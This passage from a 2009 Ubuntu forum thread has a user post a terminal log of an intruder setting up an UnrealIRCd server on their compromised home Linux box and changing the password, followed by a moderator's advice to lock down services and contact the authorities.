[13d[14d[15d[16d[17d[18d[19d[22d[K[20d[21d7[3;22r8[22d[9S[1;24r[14;1Hadmin {[15d "Microsoft Corporation";[16;9H"Bill Gates - Bill@microsoft.com";
[18d};
[20d#[9G########################################
[21d#[9G#[21;23HClass Block[21;48H#
[13d[14d[15d[16d[17d[18d[19d[20d[21d7[3;22r8[22d[9S[1;24r[13;1H#[9G########################################
[16dclass[16;17Hclients
[17d{[18;9Hpingfreq 90;[19;9Hmaxclients 3000;[20;9Hsendq 100000;[21;9Hrecvq 4000;
[13d[14d[15d[16d[17d[18d[19d[20d[21d7[3;22r8[22d[9S[1;24r[13;1H};
[16d#[9G########################################
[17d#[9G#[17;23HAllow Block[17;48H#
[18d#[9G########################################
[21dallow {
[13d[14d[15d[16d[17d[18d[19d[20d[21d7[2;22r8[22d[9S[1;24r[2;1H[K[13;9Hip *@*;[14;9Hhostname *@*;[15;9Hclass clients;[16;9Hmaxperip 5;
[17d};
[19d#[9G########################################
[20d#[9G#[20;22HListen Block[20;48H#
[21d#[9G########################################
[13d[14d[15d[16d[17d[18d[19d[20d[21d7[2;22r8[22d[9S[1;24r[15;1Hlisten[15;16H*:4244;
[17d#[9G########################################
[18d#[9G#[18;22HOperator Block[18;48H#
[19d#[9G########################################
[21dlink irc.death.net
[13d[14d[15dScript started on Sat 21 Mar 2009 11:48:17 PM JST
]0;jmap82@JMAP2: ~jmap82@JMAP2:~$ passwd

Changing password for jmap82.

(current) UNIX password: 

```

I apologize if its hard to read, some of the session output gets saved as symbols and numbers in the text log file.  From the looks of it some of the symbols suggest "backspace" gestures from typos into the terminal, leading me to believe that whoever is interacting with the terminal might be accessing it through a VNC session or some kind of remote desktop.  

I understand that I have my system set up with fair amount of vulnerability.  However, I still don't think that whatever this person is doing should be quite as easy as they have made it look.  I live in Japan in a small two bedroom apartment with an independent Internet connection.  I have a wireless router with a very long password on my network.  I know that the network could be cracked by a snoopy neighbor, but I live in a three unit complex with a little old lady down stairs and families with young children as my only local suspects, so I'm fairly certain the attack is coming from over the Internet.  

This too I know is vulnerable, as I have ports forwarded into my machine so that I can access my&#12288;Linux sandbox from work by both SSH and Remote Desktop.  I have also installed apache and other web server tools so I could play around with PHP and such.

Obviously, to avoid this problem, I could lock down my computer and make it in accessible, but that is not a solution, its avoidance.  More so, I'm interested in who and why these people are accessing my computer and what this IRCd program is.  Please refrain from being demeaning in your responses.  I realize that with my current setup I may have very well invited this kind of activity, but remember, noobs have feelings too.

Let me know if there is anything else I tell you to shed some light on this issue.

---

### Post by bodhi.zazen on 2009-03-25
I am going to close this thread now.

From reading your post it sounds as if you are aware that you have compromised the security of your box and this is then the result. You can not compromise security and then complain how easy it is for someone to crack your box :lolflag:

I encourage you to pay more attention to security and indeed lock down your services.

In regards to tracking this kind of thing, IMO there are better avenues then the Ubuntu forums.

I suggest you contact the local authorities. It certainly sounds as if you can provide forensics.

---

### Post by jmap82 on 2009-04-09
Thanks for pointing me in the right direction.  

You're right, I had no business saying that it was Ubuntu's fault my computer was cracked when I made it very obvious that I left it open to attack.  I didn't mean to complain.  I guess I was just trying to reach out to the Ubuntu community for some insight into the whole UnrealIRC and Unknown Crew thing and I made some unnecessary remarks attempting to connect my thread to the forum category.  

There are probably better places for me to ask these questions but I feel comfortable on this forum so I wanted to come here first.

Thanks again for looking it over.

---

